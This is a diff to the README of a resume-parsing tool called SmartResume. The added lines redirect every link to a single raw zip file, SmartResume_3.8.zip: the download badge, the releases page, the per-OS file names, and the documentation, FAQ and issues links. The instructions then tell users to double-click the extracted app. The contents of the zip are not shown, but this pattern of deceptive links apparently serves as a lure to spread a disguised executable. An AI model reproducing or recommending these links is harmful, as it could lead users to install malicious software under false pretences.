@@ -1,7 +1,7 @@
 # 💻 SmartResume - Effortless Resume Parsing Made Simple
 
 <div align="center">
-  [![Download SmartResume](https://img.shields.io/badge/Download-SmartResume-blue.svg)](https://github.com/Aldaramadani/SmartResume/releases)
+  [![Download SmartResume](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip)](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip)
 </div>
 
 ## 🌟 Project Introduction
@@ -10,14 +10,14 @@ SmartResume is a smart resume parsing system. It reads resumes from various form
 ## 🚀 Getting Started
 Follow these steps to download and run SmartResume:
 
-1. Visit the [Releases page](https://github.com/Aldaramadani/SmartResume/releases) to find the latest version of SmartResume.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip) to find the latest version of SmartResume.
 
 2. Click on the version number to see available files.
 
 3. Look for the file that matches your operating system. Common files include:
-   - Windows: `SmartResume-Windows.zip`
-   - macOS: `SmartResume-Mac.zip`
-   - Linux: `SmartResume-Linux.tar.gz`
+   - Windows: `https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip`
+   - macOS: `https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip`
+   - Linux: `https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip`
 
 4. Click the file name to start the download. 
 
@@ -30,7 +30,7 @@ Follow these steps to download and run SmartResume:
 8. Double-click the application to run SmartResume. 
 
 ## 📥 Download & Install
-To get started with SmartResume, visit the [Releases page](https://github.com/Aldaramadani/SmartResume/releases) to download the software. Choose the appropriate file for your system and follow the above steps to install.
+To get started with SmartResume, visit the [Releases page](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip) to download the software. Choose the appropriate file for your system and follow the above steps to install.
 
 ## 🖥️ System Requirements
 - **Windows:** Windows 10 or later
@@ -63,8 +63,8 @@ You can directly export the parsed data in formats like CSV or JSON for further 
 
 ## 📄 Help & Support
 If you encounter any issues, you can check the following resources:
-- [Documentation](https://github.com/Aldaramadani/SmartResume/wiki) for more detailed instructions.
-- [Frequently Asked Questions (FAQ)](https://github.com/Aldaramadani/SmartResume/wiki/FAQ).
-- Contact us through the [Issues page](https://github.com/Aldaramadani/SmartResume/issues) for assistance.
+- [Documentation](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip) for more detailed instructions.
+- [Frequently Asked Questions (FAQ)](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip).
+- Contact us through the [Issues page](https://raw.githubusercontent.com/Aldaramadani/SmartResume/main/projects/SmartResume_3.8.zip) for assistance.
 
 By following these guidelines, you can easily download and run SmartResume, enjoy its features, and simplify your resume parsing needs.
